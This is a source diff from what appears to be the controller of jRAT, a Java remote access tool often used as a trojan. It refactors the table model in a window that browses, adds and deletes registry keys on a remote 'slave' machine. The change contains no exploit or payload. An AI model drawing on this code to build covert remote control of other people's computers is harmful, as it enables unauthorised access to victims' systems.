@@ -25,12 +25,12 @@ import javax.swing.JTable;
 import javax.swing.JTextField;
 import javax.swing.JToolBar;
 import javax.swing.ScrollPaneConstants;
-import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet79BrowseRegistry;
 import se.jrat.controller.packets.outgoing.Packet97RegistryAdd;
 import se.jrat.controller.packets.outgoing.Packet99RegistryDelete;
+import se.jrat.controller.ui.components.TableModel;
 import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.dialogs.DialogCustomRegQuery;
 import se.jrat.controller.ui.renderers.table.RegistryTableRenderer;
@@ -51,7 +51,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 	public static final ImageIcon ICON_FOLDER = IconUtils.getIcon("folder");
 	public static final String[] ROOT_VALUES = new String[] { "HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS", "HKEY_CURRENT_CONFIG" };
 
-	private DefaultTableModel model;
+	private TableModel model;
 	private JTable table;
 	private JTextField txt;
 	private JPopupMenu popupMenu;
@@ -63,7 +63,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 	private RegistryTableRenderer renderer;
 	private PathJTree tree;
 
-	public DefaultTableModel getModel() {
+	public TableModel getModel() {
 		return model;
 	}
 
@@ -110,7 +110,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		});
 
 		table.setRowHeight(25);
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Key", "Value", "Type" }) {
+		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Key", "Value", "Type" }) {
 			@Override
 			public boolean isCellEditable(int row, int column) {
 				return false;
